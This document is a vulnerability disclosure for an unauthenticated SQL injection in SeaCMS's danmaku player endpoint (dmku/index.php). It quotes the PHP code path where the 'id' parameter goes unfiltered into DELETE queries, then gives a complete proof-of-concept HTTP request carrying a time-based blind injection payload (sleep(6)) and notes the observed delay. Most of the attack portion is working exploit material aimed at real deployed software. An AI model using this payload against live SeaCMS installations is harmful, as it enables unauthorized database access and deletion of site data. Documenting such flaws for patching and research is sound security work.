**/js/player/dmplayer/dmku/index.php Unauthorized access to sql injection**

When ac=del, type=list

```java
else if ($_GET['ac'] == "del") {
        $id = $_GET['id'] ?: succeedmsg(-1, null);
        $type = $_GET['type'] ?: succeedmsg(-1, null);
        $data = $d->删除弹幕($id) ?: succeedmsg(0, []);
        succeedmsg(23, true);
```



Enter删除弹幕($id)

```java
public function 删除弹幕($id)
    {
        //sql::插入_弹幕($data);
        sql::删除_弹幕数据($id);
    }
```

Enter  sql::删除_弹幕数据($id);

```java
public static function 删除_弹幕数据($id)
    {
        try {
            global $_config;
            $conn = @new mysqli($_config['数据库']['地址'], $_config['数据库']['用户名'], $_config['数据库']['密码'], $_config['数据库']['名称'], $_config['数据库']['端口']);
            $conn->set_charset('utf8');
            if ($_GET['type'] == "list") {
                $sql = "DELETE FROM sea_danmaku_report WHERE cid={$id}";
                $result = "DELETE FROM sea_danmaku_list WHERE cid={$id}";
                $conn->query($sql);
                $conn->query($result);
            } else if ($_GET['type'] == "report") {
                $sql = "DELETE FROM sea_danmaku_report WHERE cid={$id}";
                $conn->query($sql);
            }
        } catch (PDOException $e) {
            showmessage(-1, '数据库错误:' . $e->getMessage());
        }
    }
```

The id can be controlled, and the type can also be controlled, and there is no filtering. When type=list or report, directly put it into the query function for query.

**Vulnerability verification**

**POC**

```java
GET /js/player/dmplayer/dmku/index.php?ac=del&id=(select(1)from(select(sleep(6)))x)&type=list HTTP/1.1
Host: seacms:8181
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://seacms:8181/js/player/dmplayer/dmku/index.php?ac=del&id=(select(1)from(select(sleep(0)))x)&type=list
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=5dl35hp50uj606p52se8kg91a2; t00ls=e54285de394c4207cd521213cebab040; t00ls_s=YTozOntzOjQ6InVzZXIiO3M6MjY6InBocCB8IHBocD8gfCBwaHRtbCB8IHNodG1sIjtzOjM6ImFsbCI7aTowO3M6MzoiaHRhIjtpOjE7fQ%3D%3D; XDEBUG_SESSION=PHPSTORM
Connection: keep-alive

```

As shown in the figure, you can see that there is indeed a delay of 6 seconds.

![image-20240821015634118](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240821015634118.png)

